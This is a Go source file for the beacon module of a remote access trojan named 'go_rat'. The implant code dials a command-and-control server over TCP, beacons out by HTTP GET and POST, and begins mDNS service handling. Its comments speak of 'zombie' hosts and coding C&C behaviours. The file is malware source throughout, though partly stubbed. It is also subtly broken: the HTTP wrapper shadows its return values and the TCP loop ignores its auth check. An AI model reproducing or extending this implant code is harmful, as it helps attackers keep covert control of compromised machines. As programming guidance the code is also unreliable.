/*/
This file contains the code for "beacons"

/*/
package Beacons

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"go_rat/pkg/shared_code/Core"
	"go_rat/pkg/shared_code/Crypto"
	"go_rat/pkg/shared_code/ErrorHandling"
	"net"
	"net/http"

	"github.com/hashicorp/mdns"
)

// TODO: "strange" ways of reaching out

// Beacons

// makes requests outside the network to get to the C&C
// command_tcpaddr is an ip:port as string for TCP connections
// if a "good password *HINT*" is provided
// has a return code to process: 0 means an error, 1 means success
func BaconTCP(command_tcpaddr net.TCPAddr) (herp *net.TCPConn, derp error) {
	// OLD: Have to cast the string to a net.IP type
	//Core.PHONEHOME_TCP.IP = net.IP(command_tcpaddr)

	// the network functions return two objects
	// a connection
	// and an error
	connection, derp := net.DialTCP("tcp", &Core.Local_tcpaddr_LAN, &command_tcpaddr) // &Core.PHONEHOME_TCP)
	if derp != nil {
		// print the error
		ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon handshake Failed")
		return
	}
	// if there was no error, continue to the control loop
	// we Assume all communication from the controller to be in json only
	// we are only sending encoded json so we should only react to encoded json
	// now we just wait...
	/// zombie should be dialing the home base expecting commands on connect
	// assuming we coded the command and control to reply on connect and not just
	// mark "we got one here" in some internal DB...
	// why dont you try coding some behaviors for the command and control binary
	// to enact on BEACON!
	// TODO: code C&C to pool callbacks into a list
	for {
		// for every line of input from tcp stream
		netData, derp := bufio.NewReader(connection).ReadString('\n')
		// if there is an error
		if derp != nil {
			// print the error
			ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon Connection Failed")
			return connection, derp // error code : potato
		}
		json_from_command, derp := json.Marshal(netData)
		if derp != nil {
			// print the error
			ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon Connection Failed")
			return connection, derp
		}
		beacon_reply := Core.BeaconResponse{
			Authstring: string(json_from_command),
		}
		// we authenticate the reply
		Crypto.Hash_auth_check(beacon_reply.Authstring)
		// now we hand off to connection_manager
		// IF the command center authed properly
	}
}

// Same for UDP
func BeaconUDP(command_tcpaddr net.UDPAddr) (return_code int, derp error) {
	return
}

// we are going to make different HTTP requests to the Command Server
// even though we are using POST, its not going to carry much data,
// and will only be used as a beacon. the handshake is a specific
// function that needs its own code and placement

///////////////////////////////////////////////////////////////////////////////
//                            HTTP STUFF
///////////////////////////////////////////////////////////////////////////////
/*/
HTTP Methods of beaconing out
	- GET
	- POST
	- maybe others
/*/

// function to call other functions
// I this because it's easy to undo, and it may prove
// useful in creation of the builder scripts
func BeaconHTTP(command_http string, method string) (herp *http.Response, derp error) {
	// switch method {
	if method == "get" {
		//case "get":
		http_response, derp := BeaconHTTPGet(command_http)
		if derp != nil {
			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
			return http_response, derp
		}
	} else if method == "post" {
		//case "post":
		http_response, derp := BeaconHTTPPost(command_http)
		if derp != nil {
			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
			return http_response, derp
		}
	} else {
		//default:
		http_response, derp := BeaconHTTPPost(command_http)
		if derp != nil {
			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
			return http_response, derp
		}
	}
	// apparently this is "naked"... o_O
	return
}

func BeaconHTTPGet(command_url string) (*http.Response, error) {
	http_response, derp := http.Get(command_url)
	if derp != nil {
		ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
		return http_response, derp
	}
	return http_response, derp
}

func BeaconHTTPPost(command_url string) (*http.Response, error) {
	post_body, derp := json.Marshal(Core.BEACONPOSTPAYLOAD)
	if derp != nil {
		ErrorHandling.RatLogError(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
	}
	// but this function we are using takes bytes!
	// so you need a line of code like THIS!!
	// to turn text to bytes!
	// Comment this for tutorial
	post_body_bytes := bytes.NewBuffer(post_body)
	http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
	if derp != nil {
		ErrorHandling.RatLogError(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
		return http_response, derp
	}
	return http_response, derp
}

/////////////////////////////////////////////////////////////////////////////
//                         DNS STUFF
/////////////////////////////////////////////////////////////////////////////

/*/
MDNS: https://en.wikipedia.org/wiki/Multicast_DNS
https://tools.ietf.org/html/rfc6762

resolves hostnames to IP addresses within small networks that do not include
a local name server. It is a zero-configuration service, using essentially the
same programming interfaces, packet formats and operating semantics as the unicast
Domain Name System (DNS). Although Stuart Cheshire designed mDNS as a stand-alone
protocol, it can work in concert with standard DNS servers.

An mDNS message is a multicast UDP packet sent using the following addressing:

    IPv4 address 224.0.0.251
	IPv6 address ff02::fb
    UDP port 5353
    When using Ethernet frames, the standard IP multicast MAC address:
		01:00:5E:00:00:FB (for IPv4)
		33:33:00:00:00:FB (for IPv6)
/*/
func MdnsResponder() {
	// Make a channel for results and start listening
	entriesCh := make(chan *mdns.ServiceEntry, 4)
	go func() {
		for entry := range entriesCh {
			fmt.Printf("Got new entry: %v\n", entry)
		}
	}()
	// Start the lookup
	mdns.Lookup("_foobar._tcp", entriesCh)
	close(entriesCh)
}

func StartMdnsReceiver(service_name string,
	ServiceObj *mdns.MDNSService,
	false_service_struct Core.FakeMDNSService) {
	// Create the mDNS server, defer shutdown
	server, _ := mdns.NewServer(&mdns.Config{Zone: ServiceObj})
	defer server.Shutdown()
}
